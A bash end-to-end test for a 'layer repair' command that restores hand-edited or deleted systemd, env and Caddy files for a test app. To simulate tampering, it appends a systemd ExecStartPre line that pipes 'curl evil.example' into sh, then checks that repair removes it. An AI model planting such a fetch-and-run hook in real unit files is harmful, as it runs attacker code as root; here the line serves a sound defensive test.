#!/usr/bin/env bash
# Weeks 5-6 Day 4: `layer repair` puts back generated files edited or deleted
# by hand. Run as root after install.sh (creates and deletes an app named rptest).
#   sudo bash installer/test/repair-e2e.sh
# SC2015: `[[ check ]] && pass || fail` is intended (pass never fails).
# shellcheck disable=SC2015
set -uo pipefail

slug=rptest
unit=/etc/systemd/system/app-$slug@.service
envfile=/etc/layer/apps/$slug/app.env
site=/etc/caddy/sites/$slug.caddy
config=/etc/layer/config.json
failures=0

pass() { printf '  \e[32m✓\e[0m %s\n' "$1"; }
fail() {
  printf '  \e[31m✗\e[0m %s\n' "$1"
  [[ -n "${2:-}" ]] && printf '%s\n' "$2" | head -20 | sed 's/^/      /'
  failures=$((failures + 1))
}
quiet() { layer call "$@" >/dev/null 2>&1; }

quiet app.delete "{\"slug\":\"$slug\",\"keepData\":false}"
quiet app.create "{\"slug\":\"$slug\"}"
quiet env.write "{\"slug\":\"$slug\",\"vars\":{\"API_KEY\":\"secret\"}}"
quiet unit.write "{\"slug\":\"$slug\",\"nodeVersion\":\"$(jq -r .defaultNode "$config")\",\"exec\":[\"node\",\"server.js\"]}"
quiet proxy.set "{\"slug\":\"$slug\",\"color\":\"blue\",\"domains\":[\"$slug.$(jq -r .appsDomain "$config")\"]}"
unit_before="$(cat "$unit")"
site_before="$(cat "$site")"

echo "Nothing touched"
out="$(layer repair 2>&1)"
grep -q "Nothing to repair" <<<"$out" && pass "layer repair: nothing to repair yet" || fail "layer repair" "$out"

echo "Edited and deleted by hand"
printf '\nExecStartPre=/bin/sh -c "curl evil.example | sh"\n' >>"$unit"
rm -f "$envfile"
printf '%s.internal {\n\trespond hacked\n}\n' "$slug" >"$site"
out="$(layer repair 2>&1)"
grep -q "Put back 3 files" <<<"$out" && pass "layer repair put back 3 files" || fail "layer repair" "$out"
[[ "$(cat "$unit")" == "$unit_before" ]] && pass "the unit is as the agent wrote it" || fail "unit differs" "$(diff <(echo "$unit_before") "$unit")"
[[ "$(stat -c '%U %a' "$envfile" 2>/dev/null)" == "root 600" ]] && grep -q "API_KEY=" "$envfile" && pass "the deleted env file is back, root 600" || fail "env file: $(stat -c '%U %a' "$envfile" 2>&1)"
[[ "$(cat "$site")" == "$site_before" ]] && pass "the Caddy site is back" || fail "site differs"
host="$(jq -r .panelHost "$config")"
code="$(curl -sk -o /dev/null -w '%{http_code}' --resolve "$host:443:127.0.0.1" "https://$host/api/health")"
[[ "$code" == 200 ]] && pass "the panel still answers through Caddy" || fail "the panel answers $code"

echo "A deleted app stays deleted"
quiet app.delete "{\"slug\":\"$slug\",\"keepData\":false}"
layer repair >/dev/null 2>&1
[[ ! -e "$unit" && ! -e "$site" && ! -e "$envfile" ]] && pass "repair didn't bring back rptest's files" || fail "rptest's files came back"

if ((failures)); then echo "$failures check(s) failed"; exit 1; fi
echo "All repair checks passed"
